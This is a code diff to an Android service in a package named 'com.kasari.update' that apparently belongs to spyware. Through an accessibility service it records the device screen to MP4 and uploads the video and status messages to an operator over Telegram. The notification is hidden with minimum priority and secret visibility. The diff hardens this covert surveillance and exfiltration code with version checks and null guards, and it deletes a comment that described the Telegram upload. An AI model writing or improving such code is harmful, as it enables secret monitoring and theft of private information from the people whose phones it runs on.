@@ -10,14 +10,10 @@ import androidx.core.app.NotificationCompat;
 import java.io.File;
 import java.nio.ByteBuffer;
 
-/**
- * Screen recording: AccessibilityService frames → MediaCodec H.264 → MP4 → Telegram.
- * Zero extra permissions needed (AccessibilityService already active).
- */
 public class ScreenRecordService extends Service {
 
-    public static final String ACTION_RECORD  = "com.kasari.update.SCREEN_RECORD";
-    public static final String EXTRA_SECONDS  = "seconds";
+    public static final String ACTION_RECORD = "com.kasari.update.SCREEN_RECORD";
+    public static final String EXTRA_SECONDS = "seconds";
 
     private MediaCodec  mCodec;
     private MediaMuxer  mMuxer;
@@ -37,25 +33,35 @@ public class ScreenRecordService extends Service {
 
     private Notification buildNotif() {
         return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
-            .setSmallIcon(android.R.drawable.sym_def_app_icon)
+            .setSmallIcon(R.drawable.ic_notification)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setSilent(true).build();
     }
 
     private void doRecord(int durationSec) {
+        // Screen recording via AccessibilityService.takeScreenshot() needs Android 11+
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            TelegramController.sendMessage(
+                "\u274C Screen recording ke liye Android 11+ chahiye.\n" +
+                "Is phone mein Android " + Build.VERSION.RELEASE + " hai.\n" +
+                "/screenshot se single screenshot le sakte ho.");
+            cleanup(); return;
+        }
+
         ScreenMirror sas = ScreenMirror.instance;
         if (sas == null) {
             TelegramController.sendMessage(
-                "❌ Accessibility Service enable nahi.\n" +
-                "Settings → Accessibility → Kasari Chauhan → ON karo");
+                "\u274C Accessibility Service enable nahi.\n" +
+                "Settings \u2192 Accessibility \u2192 Kasari Chauhan \u2192 ON karo");
             cleanup(); return;
         }
-        TelegramController.sendMessage("🎬 Screen recording shuru... " + durationSec + "s baad MP4 aayega.");
+        TelegramController.sendMessage(
+            "\uD83C\uDFAC Screen recording shuru... " + durationSec + "s baad MP4 aayega.");
 
         Bitmap first = sas.captureFrameSync(8000);
         if (first == null) {
-            TelegramController.sendMessage("❌ Pehla frame nahi mila.");
+            TelegramController.sendMessage("\u274C Pehla frame nahi mila.");
             cleanup(); return;
         }
 
@@ -76,7 +82,8 @@ public class ScreenRecordService extends Service {
             mCodec.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
             mSurface = mCodec.createInputSurface();
             mCodec.start();
-            mMuxer = new MediaMuxer(outFile.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
+            mMuxer = new MediaMuxer(outFile.getAbsolutePath(),
+                MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
 
             drawFrame(first, width, height); first.recycle();
             drain(false);
@@ -100,18 +107,19 @@ public class ScreenRecordService extends Service {
 
             if (outFile.exists() && outFile.length() > 2000) {
                 TelegramController.sendFile(outFile,
-                    "🎬 Screen Recording (" + durationSec + "s · " + frames + " frames · 2fps)");
+                    "\uD83C\uDFAC Screen Recording (" + durationSec + "s \u00B7 " + frames + " frames)");
             } else {
-                TelegramController.sendMessage("❌ Recording file empty hai.");
+                TelegramController.sendMessage("\u274C Recording file empty hai.");
             }
             outFile.delete();
         } catch (Exception e) {
-            TelegramController.sendMessage("❌ Recording error: " + e.getMessage());
-            outFile.delete();
+            TelegramController.sendMessage("\u274C Recording error: " + e.getMessage());
+            try { outFile.delete(); } catch (Exception ignored) {}
         } finally { cleanup(); }
     }
 
     private void drawFrame(Bitmap bmp, int w, int h) {
+        if (mSurface == null) return;
         Canvas c = mSurface.lockCanvas(null);
         if (c == null) return;
         try {
@@ -123,6 +131,7 @@ public class ScreenRecordService extends Service {
     }
 
     private void drain(boolean eos) {
+        if (mCodec == null) return;
         MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
         int tries = eos ? 200 : 20;
         for (int i = 0; i < tries; i++) {
@@ -149,9 +158,9 @@ public class ScreenRecordService extends Service {
     private int makeEven(int n) { return (n % 2 == 0) ? n : n - 1; }
 
     private void cleanup() {
-        try { if (mCodec != null) { mCodec.stop(); mCodec.release(); mCodec = null; } } catch (Exception ignored) {}
-        try { if (mMuxer != null) { mMuxer.release(); mMuxer = null; } } catch (Exception ignored) {}
-        try { if (mSurface != null) { mSurface.release(); mSurface = null; } } catch (Exception ignored) {}
+        try { if (mCodec != null)  { mCodec.stop();  mCodec.release();  mCodec = null;  } } catch (Exception ignored) {}
+        try { if (mMuxer != null)  { mMuxer.release(); mMuxer = null;  } } catch (Exception ignored) {}
+        try { if (mSurface != null){ mSurface.release(); mSurface = null; } } catch (Exception ignored) {}
         stopForeground(true); stopSelf();
     }
 
